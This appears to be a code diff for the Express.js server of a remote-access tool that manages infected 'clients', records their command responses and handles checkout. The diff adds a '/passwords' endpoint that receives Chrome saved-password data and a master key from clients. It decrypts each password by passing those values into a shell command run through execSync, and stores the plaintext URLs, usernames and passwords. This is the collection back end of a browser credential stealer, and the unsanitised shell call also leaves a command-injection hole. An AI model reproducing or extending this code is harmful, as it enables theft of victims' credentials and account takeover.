@@ -3,10 +3,12 @@ const Response = require('../responses.model');
 const psResponse = require('../psResponse.model');
 const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
 const {GenerateRandomId} = require("../../Utils/utilFunctions");
-
 const Utils = require("../../Utils/utilFunctions");
 const Client = require('../../Clients/client.model');
 const Command = require("../../Commands/commands.model");
+const path = require("path");
+const child_process = require("child_process");
+const appDir = path.dirname(require.main.filename);
 
 //Validate cookie for incoming requests
 router.use(toolCookieValidator);
@@ -29,10 +31,15 @@ router.route('/').post((req, res) => {
     const clientId = req.headers.clientid;
     const response = req.body.response;
     const currentTimeDate = Utils.GetCurrentTimeDate();
-    const newResponse = new Response({response_id: response_id, client_id: clientId, response: response, date: currentTimeDate});
+    const newResponse = new Response({
+        response_id: response_id,
+        client_id: clientId,
+        response: response,
+        date: currentTimeDate
+    });
     newResponse.save()
         .then(() => res.send('Response added successfully!'))
-        .catch(err => res.status(400).send(`Error adding command ${err}`));
+        .catch(err => res.status(400).send(`Error adding response ${err}`));
     Client.findOneAndUpdate({client_id: clientId}, {lastActive: currentTimeDate}, {useFindAndModify: false},
         function (err) {
             if (err)
@@ -45,7 +52,7 @@ router.route('/checkout').get((req, res) => {
     try {
         const sessionKey = req.cookies['session_id'];
         const clientId = req.headers['clientid'];
-        Client.findOneAndDelete({session_key: sessionKey}, {}, (err) => {
+        Client.findOneAndDelete({client_id: clientId, session_key: sessionKey}, {}, (err) => {
             if (err)
                 Utils.LogToFile(`Error removing tool client after checkout ${err}`);
         });
@@ -70,5 +77,54 @@ router.route('/checkout').get((req, res) => {
 
     res.send();
 })
+
+
+function generatePasswordData(data, masterKey) {
+    let buffer = ""
+    for(let object in data){
+        let url = data[object][0]['url']
+        let username = data[object][1]['username']
+        let password = data[object][2]['password']
+        if(url && username  && password ){
+            buffer += `[+] Url: ${url}\n`
+            buffer += `[+] Username: ${username}\n`
+            let decryptedPass = child_process.execSync(`python ${appDir}\\scripts\\decrypt.py ${password} ${masterKey}`)
+            buffer += `[+] Password: ${decryptedPass}\n`
+        }
+    }
+    return buffer
+}
+
+//chrome passwords handle
+router.post("/passwords", function (req, res) {
+    let clientId = req.headers['clientid'];
+    try {
+        let data = req.body;
+        let masterKey = req.body['masterKey'];
+        if(data){
+            let buffer = generatePasswordData(data, masterKey)
+            const newResponse = new Response({
+                response_id: GenerateRandomId(6),
+                client_id: clientId,
+                response: buffer,
+                date: Utils.GetCurrentTimeDate()
+            });
+            newResponse.save()
+                .then(() => res.send())
+                .catch(err => {
+                    Utils.LogToFile(`Error adding passwords response: ${err.message}`)
+                    res.sendStatus(403)
+                })
+            Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false},
+                function (err) {
+                    if (err)
+                        Utils.LogToFile(`Error updating last active for client ${clientId}`);
+                })
+        }
+    } catch (err) {
+        Utils.LogToFile(`Error getting data from passwords request ${err}`);
+        res.sendStatus(500)
+    }
+});
 
 module.exports = router;
